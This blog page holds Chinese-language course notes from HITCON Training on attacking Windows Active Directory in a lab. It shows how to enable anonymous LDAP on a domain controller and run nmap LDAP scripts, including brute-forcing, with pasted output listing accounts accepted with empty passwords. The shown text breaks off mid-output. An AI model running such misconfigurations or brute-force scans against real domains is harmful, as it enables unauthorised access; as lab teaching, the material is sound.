<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="password: HITCON
轉眼間來到 windows AD 的筆記了這個也是上 HITCON Training 的課程筆記
LAB 1 - AD Reconnaissance
這個主要是針對 AD 做 Recon 的動作
注:以下所有 ip 192.168.43.147 -&amp;gt; AD, ">
    

    <!--Author-->
    
        <meta name="author" content="AStar">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="windows-AD-exploit-note (未完)"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="AStar&#39;s Blog"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

        <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>windows-AD-exploit-note (未完) - AStar&#39;s Blog</title>

    <!-- Bootstrap Core CSS -->
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Google Analytics -->
    


    <!-- favicon -->
    
	
</head>


<body>

    <!-- Menu -->
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">AStar</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                
                    <li>
                        <a href="/">
                            
                                Home
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/archives">
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/tags">
                            
                                Tags
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/categories">
                            
                                Categories
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="https://github.com/klugjo/hexo-theme-clean-blog">
                            
                                <i class="fa fa-github fa-stack-2x"></i>
                            
                        </a>
                    </li>
                
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>

    <!-- Main Content -->
    <!-- Page Header -->
<!-- Set your background image for this header in your post front-matter: cover -->

<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <h1>windows-AD-exploit-note (未完)</h1>
                    
                    <span class="meta">
                        <!-- Date and Author -->
                        
                        
                            2020-10-10
                        
                    </span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">

            <!-- Tags and categories -->
           

            <!-- Gallery -->
            

            <!-- Post Main Content -->
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <p>password: HITCON</p>
<p>轉眼間來到 windows AD 的筆記了<br>這個也是上 HITCON Training 的課程筆記</p>
<h1 id="LAB-1-AD-Reconnaissance"><a href="#LAB-1-AD-Reconnaissance" class="headerlink" title="LAB 1 - AD Reconnaissance"></a>LAB 1 - AD Reconnaissance</h1><hr>
<p>這個主要是針對 AD 做 Recon 的動作</p>
<p><img src="/img/2020/windows_ad/windows_AD_lab1_0.png" alt=""><br><code>注:以下所有 ip 192.168.43.147 -&gt; AD, 192.168.43.148 -&gt; PC01</code><br>這個 Lab 練習主要是建立在 AD 有開 anonymous 的情況下成立</p>
<p>所以我們要先開 anonymous login 的選項</p>
<h2 id="Vuln-Settings"><a href="#Vuln-Settings" class="headerlink" title="Vuln Settings"></a>Vuln Settings</h2><p><code>Windows Administrative Tools -&gt; ADSI Edit -&gt; Right Click -&gt; Connect to ...</code></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab1_1.png" alt=""> </p>
<p>選成上面那樣後再按 ok 下面就會出現一台 <code>Configuration [DC01.training.local]</code></p>
<p><code>CN=Services -&gt; CN=Windows NT -&gt;  CN=Directory Service -&gt; Right Click -&gt; Properties -&gt; Set dSHeuristics to 0000002</code></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab1_2.png" alt=""></p>
<p>Ref: <a href="https://support.microsoft.com/en-us/help/326690/anonymous-ldap-operations-to-active-directory-are-disabled-on-windows" target="_blank" rel="noopener">https://support.microsoft.com/en-us/help/326690/anonymous-ldap-operations-to-active-directory-are-disabled-on-windows</a></p>
<p>上面是允許 anonymous 登入，但我們還需要創建 <code>anonymous</code> 使用者和賦予它相關的權限<br>所以…</p>
<p><code>Windows Administrative Tools -&gt; Active Directory Users and Computers -&gt; View -&gt; enable Advanced Features</code></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab1_3.png" alt=""></p>
<p><code>Training.local right click -&gt; Properties -&gt; Security -&gt; Add -&gt; Enter anonymous -&gt; Ok</code><br><img src="/img/2020/windows_ad/windows_AD_lab1_4.png" alt=""><br><code>Training.local right click -&gt; Properties -&gt; Security -&gt; Advanced -&gt; ANONYMOUS LOGON -&gt; Edit -&gt; Applies to “This object and all descendant objects” -&gt; OK</code><br><img src="/img/2020/windows_ad/windows_AD_lab1_5.png" alt=""><br>注意要先創建 <code>anonymous</code> user, 如果沒有創的話 <code>ANONYMOUS LOGON</code> 不會出現</p>
<p>上面設定完之後，<code>RD Dept</code>也會出現 <code>anonymous</code> user</p>
<p>如果不想設定 Root 允許 anonymous login 的話也可以只針對 <code>RD Dept</code> 進行設定</p>
<p><img src="/img/2020/windows_ad/windows_AD_lab1_6.png" alt=""></p>
<p>Ref: <a href="https://activedirectoryfaq.com/2016/09/anonymous-access/" target="_blank" rel="noopener">https://activedirectoryfaq.com/2016/09/anonymous-access/</a></p>
<h2 id="針對-AD-的-Recon"><a href="#針對-AD-的-Recon" class="headerlink" title="針對 AD 的 Recon"></a>針對 AD 的 Recon</h2><p>設定完之後再來就是開始 recon</p>
<p>工具列表:</p>
<ul>
<li>Nmap LDAP script (Kali)</li>
<li>ldapsearch (Kali)</li>
<li>jxplorer (Kali)</li>
</ul>
<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p><code>nmap  -p 389 -T4 --script=ldap* 192.168.43.147 (ad IP)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 01:51 CST</span><br><span class="line">Nmap scan report for 192.168.43.147</span><br><span class="line">Host is up (0.00036s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">389/tcp open  ldap</span><br><span class="line">| ldap-brute: </span><br><span class="line">|   root:&lt;empty&gt; =&gt; Valid credentials</span><br><span class="line">|   admin:&lt;empty&gt; =&gt; Valid credentials</span><br><span class="line">|   administrator:&lt;empty&gt; =&gt; Valid credentials</span><br><span class="line">|   webadmin:&lt;empty&gt; =&gt; Valid credentials</span><br><span class="line">|   sysadmin:&lt;empty&gt; =&gt; Valid credentials</span><br><span class="line">|   netadmin:&lt;empty&gt; =&gt; Valid credentials</span><br><span class="line">|   guest:&lt;empty&gt; =&gt; Valid credentials</span><br><span class="line">|   user:&lt;empty&gt; =&gt; Valid credentials</span><br><span class="line">|   web:&lt;empty&gt; =&gt; Valid credentials</span><br><span class="line">|_  test:&lt;empty&gt; =&gt; Valid credentials</span><br><span class="line">| ldap-rootdse: </span><br><span class="line">| LDAP Results</span><br><span class="line">|   &lt;ROOT&gt;</span><br><span class="line">|       currentTime: 20201010175147.0Z</span><br><span class="line">|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|       dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=training,DC=local</span><br><span class="line">|       namingContexts: DC=training,DC=local</span><br><span class="line">|       namingContexts: CN=Configuration,DC=training,DC=local</span><br><span class="line">|       namingContexts: CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|       namingContexts: DC=DomainDnsZones,DC=training,DC=local</span><br><span class="line">|       namingContexts: DC=ForestDnsZones,DC=training,DC=local</span><br><span class="line">|       defaultNamingContext: DC=training,DC=local</span><br><span class="line">|       schemaNamingContext: CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|       configurationNamingContext: CN=Configuration,DC=training,DC=local</span><br><span class="line">|       rootDomainNamingContext: DC=training,DC=local</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.319</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.801</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.473</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.528</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.417</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.619</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.841</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.529</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.805</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.521</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.970</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.1338</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.474</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.1339</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.1340</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.1413</span><br><span class="line">|       supportedControl: 2.16.840.1.113730.3.4.9</span><br><span class="line">|       supportedControl: 2.16.840.1.113730.3.4.10</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.1504</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.1852</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.802</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.1907</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.1948</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.1974</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.1341</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.2026</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.2064</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.2065</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.2066</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.2090</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.2205</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.2204</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.2206</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.2211</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.2239</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.2255</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.2256</span><br><span class="line">|       supportedControl: 1.2.840.113556.1.4.2309</span><br><span class="line">|       supportedLDAPVersion: 3</span><br><span class="line">|       supportedLDAPVersion: 2</span><br><span class="line">|       supportedLDAPPolicies: MaxPoolThreads</span><br><span class="line">|       supportedLDAPPolicies: MaxPercentDirSyncRequests</span><br><span class="line">|       supportedLDAPPolicies: MaxDatagramRecv</span><br><span class="line">|       supportedLDAPPolicies: MaxReceiveBuffer</span><br><span class="line">|       supportedLDAPPolicies: InitRecvTimeout</span><br><span class="line">|       supportedLDAPPolicies: MaxConnections</span><br><span class="line">|       supportedLDAPPolicies: MaxConnIdleTime</span><br><span class="line">|       supportedLDAPPolicies: MaxPageSize</span><br><span class="line">|       supportedLDAPPolicies: MaxBatchReturnMessages</span><br><span class="line">|       supportedLDAPPolicies: MaxQueryDuration</span><br><span class="line">|       supportedLDAPPolicies: MaxDirSyncDuration</span><br><span class="line">|       supportedLDAPPolicies: MaxTempTableSize</span><br><span class="line">|       supportedLDAPPolicies: MaxResultSetSize</span><br><span class="line">|       supportedLDAPPolicies: MinResultSets</span><br><span class="line">|       supportedLDAPPolicies: MaxResultSetsPerConn</span><br><span class="line">|       supportedLDAPPolicies: MaxNotificationPerConn</span><br><span class="line">|       supportedLDAPPolicies: MaxValRange</span><br><span class="line">|       supportedLDAPPolicies: MaxValRangeTransitive</span><br><span class="line">|       supportedLDAPPolicies: ThreadMemoryLimit</span><br><span class="line">|       supportedLDAPPolicies: SystemMemoryLimitPercent</span><br><span class="line">|       highestCommittedUSN: 28698</span><br><span class="line">|       supportedSASLMechanisms: GSSAPI</span><br><span class="line">|       supportedSASLMechanisms: GSS-SPNEGO</span><br><span class="line">|       supportedSASLMechanisms: EXTERNAL</span><br><span class="line">|       supportedSASLMechanisms: DIGEST-MD5</span><br><span class="line">|       dnsHostName: DC01.training.local</span><br><span class="line">|       ldapServiceName: training.local:dc01$@TRAINING.LOCAL</span><br><span class="line">|       serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=training,DC=local</span><br><span class="line">|       supportedCapabilities: 1.2.840.113556.1.4.800</span><br><span class="line">|       supportedCapabilities: 1.2.840.113556.1.4.1670</span><br><span class="line">|       supportedCapabilities: 1.2.840.113556.1.4.1791</span><br><span class="line">|       supportedCapabilities: 1.2.840.113556.1.4.1935</span><br><span class="line">|       supportedCapabilities: 1.2.840.113556.1.4.2080</span><br><span class="line">|       supportedCapabilities: 1.2.840.113556.1.4.2237</span><br><span class="line">|       isSynchronized: TRUE</span><br><span class="line">|       isGlobalCatalogReady: TRUE</span><br><span class="line">|       domainFunctionality: 7</span><br><span class="line">|       forestFunctionality: 7</span><br><span class="line">|_      domainControllerFunctionality: 7</span><br><span class="line">| ldap-search: </span><br><span class="line">|   Context: DC=training,DC=local</span><br><span class="line">|     dn: DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: domain</span><br><span class="line">|         objectClass: domainDNS</span><br><span class="line">|         distinguishedName: DC=training,DC=local</span><br><span class="line">|         instanceType: 5</span><br><span class="line">|         whenCreated: 2020/10/09 15:41:13 UTC</span><br><span class="line">|         whenChanged: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         subRefs: DC=ForestDnsZones,DC=training,DC=local</span><br><span class="line">|         subRefs: DC=DomainDnsZones,DC=training,DC=local</span><br><span class="line">|         subRefs: CN=Configuration,DC=training,DC=local</span><br><span class="line">|         uSNCreated: 4099</span><br><span class="line">|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xF4\x80+\x08\x97\xDE\xF5L\x981\xBC\xB5\x8A]\x8F\xB8</span><br><span class="line">|         uSNChanged: 28698</span><br><span class="line">|         name: training</span><br><span class="line">|         objectGUID: 937239f0-c416-9a46-bbc4-5ea67c79cd43</span><br><span class="line">|         creationTime: 132468251026790991</span><br><span class="line">|         forceLogoff: -9223372036854775808</span><br><span class="line">|         lockoutDuration: -18000000000</span><br><span class="line">|         lockOutObservationWindow: -18000000000</span><br><span class="line">|         lockoutThreshold: 0</span><br><span class="line">|         maxPwdAge: -36288000000000</span><br><span class="line">|         minPwdAge: -864000000000</span><br><span class="line">|         minPwdLength: 7</span><br><span class="line">|         modifiedCountAtLastProm: 0</span><br><span class="line">|         nextRid: 1000</span><br><span class="line">|         pwdProperties: 1</span><br><span class="line">|         pwdHistoryLength: 24</span><br><span class="line">|         objectSid: 1-5-21-2501991368-4163896689-842069156</span><br><span class="line">|         serverState: 1</span><br><span class="line">|         uASCompat: 1</span><br><span class="line">|         modifiedCount: 1</span><br><span class="line">|         auditingPolicy: \x00\x01</span><br><span class="line">|         nTMixedDomain: 0</span><br><span class="line">|         rIDManagerReference: CN=RID Manager$,CN=System,DC=training,DC=local</span><br><span class="line">|         fSMORoleOwner: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         systemFlags: -1946157056</span><br><span class="line">|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=training,DC=local</span><br><span class="line">|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=training,DC=local</span><br><span class="line">|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=training,DC=local</span><br><span class="line">|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=training,DC=local</span><br><span class="line">|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=training,DC=local</span><br><span class="line">|         wellKnownObjects: 